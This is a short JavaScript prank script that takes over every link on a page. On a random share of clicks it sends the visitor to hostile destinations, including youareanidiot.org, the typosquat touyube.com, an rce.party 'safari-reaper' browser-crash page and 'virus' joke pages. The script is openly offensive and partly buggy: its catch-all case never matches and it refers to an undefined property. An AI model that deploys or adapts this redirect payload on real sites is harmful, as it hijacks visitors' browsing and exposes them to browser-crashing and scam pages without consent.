/*
1: TomVirus
2: WVirus
3: YouAreAnIdiot
4: touyube.com
5: safari-reaper
6: なし
*/

var aTag, i, random

aTag = document.getElementsByTagName('a')

setInterval(function () {
  for (i = aTag.length - 1; i >= 0; i--) {
    aTag[i].onclick = function () {
      random = Math.floor(Math.random() * 20) + 1
      console.log(random)
      switch (random) {
        case 1:
          location.href = 'http://kimagure.html.xdomain.jp/virus/'
          return false
        case 2:
          // location.href = 'https://wpqpqw.github.io/projects/Seika/20190224/virus/'
          location.href = '../VirusTest/virus/'
          return false
        case 3:
          location.href = 'http://youareanidiot.org'
          return false
        case 4:
          location.href = 'http://touyube.com'
          return false
        case 5:
          location.href = 'http://rce.party/CRASH/safari-reaper.html'
          return false
        case 6:
          location.href = '#'
          return false
        case [7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]:
          location.href = aTag[i].OriginalHref
      }
    }
  }
}
, 1)
